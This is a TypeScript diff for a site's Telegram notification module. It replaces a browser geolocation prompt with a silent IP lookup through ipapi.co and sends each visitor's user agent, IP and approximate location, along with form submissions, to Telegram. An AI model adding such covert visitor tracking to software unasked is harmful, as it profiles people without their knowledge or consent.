@@ -16,6 +16,34 @@ export interface FormSubmissionData {
   price: string;
 }
 
+// Helper function to get user's IP and location
+const getUserIPAndLocation = async (): Promise<{ ip: string; location: string }> => {
+  try {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    
+    if (data.error) {
+      console.error('IP API error:', data.reason);
+      return {
+        ip: 'Unknown',
+        location: 'Location unavailable'
+      };
+    }
+    
+    const location = `${data.city || 'Unknown'}, ${data.region || ''} ${data.country_name || ''}`.trim();
+    return {
+      ip: data.ip || 'Unknown',
+      location: location || 'Location unavailable'
+    };
+  } catch (error) {
+    console.error('Failed to get IP and location:', error);
+    return {
+      ip: 'Unknown',
+      location: 'Location unavailable'
+    };
+  }
+};
+
 export const sendTelegramNotification = async (
   type: 'user_info' | 'form_submission',
   data: UserInfoData | FormSubmissionData
@@ -41,10 +69,12 @@ export const sendTelegramNotification = async (
 };
 
 export const sendUserInfoNotification = async (userInfo?: Partial<UserInfoData>) => {
+  const ipAndLocation = await getUserIPAndLocation();
+  
   const data: UserInfoData = {
     userAgent: navigator.userAgent,
-    location: await getCurrentLocation(),
-    ip: await getUserIP(),
+    location: ipAndLocation.location,
+    ip: ipAndLocation.ip,
     ...userInfo
   };
 
@@ -53,38 +83,4 @@ export const sendUserInfoNotification = async (userInfo?: Partial<UserInfoData>)
 
 export const sendFormSubmissionNotification = async (formData: FormSubmissionData) => {
   return sendTelegramNotification('form_submission', formData);
-};
-
-// Helper function to get user's IP
-const getUserIP = async (): Promise<string> => {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error('Failed to get IP:', error);
-    return 'Unknown';
-  }
-};
-
-// Helper function to get user's location
-const getCurrentLocation = (): Promise<string> => {
-  return new Promise((resolve) => {
-    if (!navigator.geolocation) {
-      resolve('Location not supported');
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const { latitude, longitude } = position.coords;
-        resolve(`${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
-      },
-      (error) => {
-        console.error('Geolocation error:', error);
-        resolve('Location denied/unavailable');
-      },
-      { timeout: 5000, enableHighAccuracy: false }
-    );
-  });
 };
